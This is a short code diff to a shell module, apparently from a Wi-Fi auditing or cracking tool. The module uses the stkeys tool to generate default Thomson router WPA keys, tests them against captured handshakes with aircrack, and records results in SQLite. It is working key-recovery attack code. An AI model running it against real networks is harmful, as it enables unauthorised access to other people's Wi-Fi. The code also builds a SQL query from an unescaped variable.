@@ -1,6 +1,7 @@
 # this module uses the compiled binary of Kevin Devine's stkeys.c (https://packetstormsecurity.com/files/84788/STKeys-Thomson-WPA-Key-Recovery-Tool-1.0.html)
 # generate keys
-$(st -o "$path"wlthomson -i $tessid)
+ST_BIN=$(which st)
+$($ST_BIN -o "$path"wlthomson -i $tessid)
 # test keys
 psk=$("$AIRCRACK_BIN" "$path$hs$bssid"*.cap -w "$path"wlthomson 2>/dev/null | grep FOUND | grep -oE '[0-9a-f]{10}' | sort -u)
 "$SQLITE3_BIN" "$path$db" "UPDATE hs SET prcsd=1 WHERE bssid='$bssid';" 2>/dev/null
